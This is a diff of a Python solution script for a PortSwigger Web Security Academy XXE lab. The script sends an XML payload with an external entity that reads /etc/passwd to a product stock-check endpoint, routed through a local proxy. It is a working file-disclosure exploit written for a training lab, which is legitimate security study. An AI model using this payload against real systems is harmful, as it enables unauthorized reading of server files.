@@ -1,13 +1,30 @@
+#!/usr/bin/env python3
+
+"""
+Python script for Web-Security-Academy XXE lab 01
+Lab URL: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
+
+SYNOPSIS
+========
+
+::
+
+  ./xxe-injection-lab-01.py https://web-security-academy.net
+
+DESCRIPTION
+===========
+XXE exploit script used to display the contents of /etc/passwd.
+
+"""
+
 import requests
 import sys
 import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def exploit_xxe(s, url):
-
     print("(+) Exploiting XXE Injection...")
     stock_url = url + '/product/stock'
     data_stock = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
@@ -25,5 +42,7 @@ def main():
     url = sys.argv[1]
     exploit_xxe(s, url)
 
+
 if __name__ == "__main__":
     main()
+
